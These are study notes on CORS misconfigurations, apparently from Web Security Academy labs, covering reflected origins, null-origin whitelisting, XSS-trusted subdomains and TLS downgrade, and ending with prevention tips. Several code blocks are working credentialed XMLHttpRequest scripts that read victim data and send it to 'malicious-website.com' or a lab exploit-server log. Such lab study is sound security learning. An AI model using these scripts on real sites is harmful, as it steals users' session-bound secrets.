# What is CORS? 
- Cross-origin resource sharing is a browser mechanism that enables controlled access to resources outside of a given domain. 
- It extends and adds flexibility to the same-origin policy (SOP).
- If a CORS policy is misconfigured, it may allow for cross-domain based attacks. 
- CORS is NOT a protection against cross-origin attacks like CSRF.

# Same-origin policy
- Same-origin policy restricts the ability for a website to interact with resources outside of the source domain.
- This was developed in response to malicious cross-domain interactions in which one website could steal private data from another. 
- It allows a domain to issue requests to other domains, but not to access the responses.

The same-origin policy restricts scripts on one origin from accessing data from another origin. An origin consists of a URI scheme, domain and port number.

Example: 
![[9937ed2957707a628c92e80191eade65-1.png]]

# Relaxation of the same-origin policy
- The same-origin policy is very restrictive, so CORS allows controlled relaxation.
- The CORS protocol uses a suite of HTTP headers to define trusted web origins.

# Vulnerabilities arising from CORS misconfigurations
Many websites use CORS to allow access from subdomains/trusted third-parties. Configurations may be too lenient to ensure everything works.
Adding a spoofed `Origin` header can test for various misconfigurations.

Tip: you might find https://www.test-cors.org/ useful for testing CORS

## Server-generated ACAO header from client-specified Origin header
Maintaining a list of allowed domains requires effort and risks breaking functionality, so some apps effectively allow access from any other domain. One way to do this is by reading the `Origin` header from requests and including a response header that allows the origin, whatever it is.

![[4bf3ce75428dbae6dbc1d650388ed8dc-1.png]]

The `Access-Control-Allow-Origin` header states that access is allowed from the domain(s) specified, and the `Access-Control-Allow-Credentials: true` means that cross-domain requests can include cookies (processed in-session)

This means that ANY domain can access resources from the vulnerable domain. If the response contains any sensitive information (API keys, CSRF), you could retrieve this by placing a script on your website and luring victims to your website.

Example exflitration script: 
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://malicious-website.com/log?key='+this.responseText;
}; 
</script>
```

## Errors parsing Origin headers
Some apps have a whitelist of allowed origins. When a CORS request is received, the supplied `Origin` is compared to the whitelist and reflected in the `Access-Control-Allow-Origin` header if allowed.

Any mistakes in implementation (including excessive subdomains, prefix/suffix checking, etc.) can lead to access granted to external domains.

Examples:
![[d2099d96cabec1c45bfe7e591a45717d-1.png]]

## Whitelisted null origin value
The `Origin` header supports the value `null`. Some apps might allow/whitelist the `null` origin to support local development. An attacker can use tricks to generate cross-domain requests containing the value `null` in the `Origin` header.

This can be done using a sandboxed `iframe` cross-origin request of the form:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe> 
```

## Exploiting XSS via CORS trust relationships
If a website trusts an origin that is vulnerable to XSS, an attacker could exploit the XSS to exfiltrate the data using CORS.

![[e64932527e7a132ee1c53567a5965fff-1.png]]

## Breaking TLS with poorly configured CORS
If an app uses HTTPS while also whitelisting a trusted subdomain using plain HTTP, an attacker who can intercept the victim's traffic can exploit CORS to compromise the victim's interactions.

![[3f676a1361f696915b851d661facbe14-1.png]]

The attack involves the following: 
- The victim user makes any plain HTTP request.
- The attacker injects (perhaps via MITM) a redirection to: http://trusted-subdomain.vulnerable-website.com
- The victim's browser follows the redirect.
- The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to: https://vulnerable-website.com
- The victim's browser makes the CORS request, including the origin: http://trusted-subdomain.vulnerable-website.com
- The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
- The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.

Example solution by redirecting to XSS vulnerable HTTP subdomain (notice some of the URL encoding to escape certain characters): 
```html
<script>
window.location.href = "http://stock.ac591f9a1f569281c099658d00250017.web-security-academy.net/?productId=<script>
var req = new XMLHttpRequest(); 
req.onload = reqListener;req.open('get','https://ac591f9a1f569281c099658d00250017.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://exploit-ace31f221f2e92c4c0b365ee01940067.web-security-academy.net/log?key='%2bthis.responseText;
}; %3c/script>&storeId=1";
</script>
```

## Intranets and CORS without credentials
Skipped

# How to prevent CORS-based attacks
## Proper configuration of cross-domain requests
- If a resource contains sensitive info, origin should be properly specified in the `Access-Control-Allow-Origin` header.

## Only allow trusted sites
- Obviously, origins in the ACAO header should be sites that are trusted (and non-exploitable)

## Avoid whitelisting null
- `Access-Control-Allow-Origin: null` can be bypassed by sandboxed requests.

## Avoid wildcards
- Just don't use them.